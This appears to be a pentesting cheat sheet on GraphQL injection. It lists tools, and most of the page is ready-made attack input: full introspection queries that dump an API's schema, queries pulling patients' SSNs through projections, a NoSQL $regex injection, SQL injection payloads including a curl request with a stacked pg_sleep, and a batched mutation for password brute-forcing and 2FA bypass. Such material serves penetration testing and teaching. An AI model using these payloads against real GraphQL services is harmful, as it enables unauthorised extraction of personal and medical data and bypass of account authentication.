# GraphQL injection

> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type


## Summary

- [GraphQL injection](#graphql-injection)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Exploit](#exploit)
    - [Identify an injection point](#identify-an-injection-point)
    - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)
    - [List path](#list-path)
    - [Extract data](#extract-data)
    - [Extract data using edges/nodes](#extract-data-using-edgesnodes)
    - [Extract data using projections](#extract-data-using-projections)
    - [Enumerate the types' definition](#enumerate-the-types-definition)
    - [Use mutations](#use-mutations)
    - [NOSQL injection](#nosql-injection)
    - [SQL injection](#sql-injection)
    - [GraphQL Batching Attacks](#graphql-batching-attacks)
  - [References](#references)

## Tools

* [GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes](https://github.com/swisskyrepo/GraphQLmap)
* [GraphQL-voyager - Represent any GraphQL API as an interactive graph](https://apis.guru/graphql-voyager/)
* [GraphQL Security Toolkit - GraphQL Security Research Material](https://github.com/doyensec/graph-ql/)
* [Graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema](https://gitlab.com/dee-see/graphql-path-enum)
* [GraphQL IDE - An extensive IDE for exploring GraphQL API's](https://github.com/andev-software/graphql-ide)
* [ClairvoyanceX - Obtain GraphQL API schema despite disabled introspection](https://github.com/mchoji/clairvoyancex)
* [InQL - A Burp Extension for GraphQL Security Testing](https://github.com/doyensec/inql)
* [Insomnia - Cross-platform HTTP and GraphQL Client](https://insomnia.rest/)
* [AutoGraphql + introspection](https://graphql-dashboard.herokuapp.com/)

## Exploit

### Identify an injection point

Most of the time the graphql is located on the `/graphql` or `/graphiql` endpoint.

```js
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

Check if errors are visible.

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```


### Enumerate Database Schema via Introspection

URL encoded query to dump the database schema.

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

URL decoded query to dump the database schema.

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

Single line query to dump the database schema without fragments.

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

### List path

```php
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

### Extract data

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)



### Extract data using edges/nodes

```json
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
} 
```

### Extract data using projections

:warning: Don’t forget to escape the " inside the **options**.

```json
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```


### Enumerate the types' definition 

Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### Use mutations

Mutations work like function, you can use them to interact with the GraphQL.

```javascript
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

### NOSQL injection

Use `$regex`, `$ne` from []() inside a `search` parameter.

```json
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```


### SQL injection

Send a single quote `'` inside a graphql parameter to trigger the SQL injection

```powershell
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

Simple SQL injection inside a graphql field.

```powershell
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

### GraphQL Batching Attacks

Common scenario:
* Password Brute-force Amplification Scenario
* 2FA bypassing

```powershell
mutation finishChannelVerificationMutation(
  $input FinishChannelVerificationInput!,
  $input2 FinishChannelVerificationInput!,
  $input3 FinishChannelVerificationInput!,
){
  first: finishChannelVerificationMutation(input: $input){
    channel{
      id
      option{
        ... onChannelSmsOptions{
          number
        }
      }
      status
      notificationSubscription(last: 1000){ etc...  }
    }
  }


  second: finishChannelVerificationMutation(input: $input2){...}
  third: finishChannelVerificationMutation(input: $input3){...}
}
```


## References

* [Introduction to GraphQL](https://graphql.org/learn/)
* [GraphQL Introspection](https://graphql.org/learn/introspection/)
* [API Hacking GraphQL - @ghostlulz - jun 8, 2019](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
* [GraphQL abuse: Bypass account level permissions through parameter smuggling - March 14, 2018 - @Detectify](https://labs.detectify.com/2018/03/14/graphql-abuse/)
* [Discovering GraphQL endpoints and SQLi vulnerabilities - Sep 23, 2018 - Matías Choren](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
* [Securing Your GraphQL API from Malicious Queries - Feb 21, 2018 - Max Stoiber](https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
* [GraphQL NoSQL Injection Through JSON Types - June 12, 2017 - Pete Corey](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
* [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Nov 6th 2018 - @jobert](https://hackerone.com/reports/435066)
* [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
* [How to set up a GraphQL Server using Node.js, Express & MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
* [GraphQL cheatsheet - DEVHINTS.IO](https://devhints.io/graphql)
* [HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
* [Introspection query leaks sensitive graphql system information - @Zuriel](https://hackerone.com/reports/291531)
* [Graphql Bug to Steal Anyone’s Address - Sept 1, 2019 - Pratik Yadav](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
* [GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019](https://lab.wallarm.com/graphql-batching-attack/)
